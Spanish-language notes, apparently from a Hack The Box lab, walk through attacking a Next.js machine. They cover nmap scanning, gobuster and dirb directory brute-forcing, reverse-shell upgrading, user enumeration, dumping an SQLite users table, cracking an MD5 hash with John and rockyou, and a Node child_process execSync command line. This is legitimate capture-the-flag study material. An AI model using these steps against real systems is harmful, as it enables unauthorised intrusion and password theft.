
*Versión Next.js 15.0.3*
*Versión de Node.js 20.20.2*

--- 
## Conectarse a HTB

Ejecutar OpenVPN usando permisos de administrador (sudo), apuntando a tu archivo descargado:
```bash
sudo openvpn tu_archivo.ovpn
```

Verificar conexión:

```bash
ping -c 4 <IP_DE_LA_MAQUINA>
```

---
## NMAP

- sudo nmap -p- -sC -sV -vvv --open -sS -n -Pn < IP > -oN (Nombre de carpeta)
- sudo nmap -sn < IP > : Util para saber si una maquina esta activa
- sudo nmap < IP >: para escanear la red.

---
## Búsqueda de directorios web

```bash
dirb http://< ip de la maquina >: < puerto de la maquina >
```

```bash
gobuster dir -u http://<IP_DE_LA_MAQUINA>:3000/ -w /usr/share/wordlists/dirb/common.txt -x html,txt,php
```

---
## Reverse shell

Para tener una interfaz agradable dentro de la reverse shell
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```


Comandos para enumerar informacion dentro del servidor
```bash
whoami: Te dirá el nombre del usuario con el que entraste (¿eres node, www-data, o un usuario común?).

id : Te muestra a qué grupos perteneces. Ojo si ves grupos raros como docker, sudo, o adm.

uname -a : Te da la versión exacta del Kernel de Linux. (Sirve para saber si el sistema operativo es viejo y vulnerable).

hostname : Te confirma si estás atrapado dentro de un contenedor Docker o si estás en la máquina real (Host). Si el nombre es un chorizo de letras y números raros (ej. a1b2c3d4e5f6), estás dentro de un contenedor.
```
---

## Identificar los usuarios del sistema

Primero, necesitas saber qué usuarios reales tienen una carpeta `home` en esa máquina. Puedes listarlos ejecutando:

```bash
ls -l /home
```

---
## Ejecutar archivo de base datos con sqlite3 y romper hash

```bash
sqlite3 --version
sqlite3 reactor.db
```

```
Podemos usar comandos slq para realizar consultas:
select * from users;
```
### Identificar el tipo de Hash
Antes de romperlo, necesitamos saber qué algoritmo lo creó (si es MD5, SHA-256, Bcrypt, etc.). Tu Kali tiene una herramienta automática espectacular para esto.

En una terminal de tu Kali (puedes usar el panel dividido que creamos antes), ejecuta:

```Bash
hashid 'AQUÍ_PEGA_EL_HASH_DE_ENGINEER'
```

### Guarda el hash en tu máquina Kali

Pon el hash del usuario `engineer` dentro de un archivo de texto llamado `hash.txt`:


```
echo "AQUÍ_PEGA_EL_HASH_DE_ENGINEER" > hash.txt
```

### Ejecuta a John configurando el formato MD5

Para que John no pierda tiempo adivinando y use toda su potencia directo contra el algoritmo correcto, le vamos a especificar el formato `--format=raw-md5` junto con el diccionario `rockyou`:


```
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### 3. Extrae la contraseña en texto plano

Como es un MD5 crudo, el ataque con el diccionario debería tardar apenas unos pocos segundos. En cuanto termine (o si quieres ver el resultado limpio), ejecuta este comando para que te muestre la palabra real:

```
john --show --format=raw-md5 hash.txt
```
---

## Script de JavaScript para ejecutar comandos de consola como usuario root

```javascript
require('child_process').execSync('whoami').toString()
```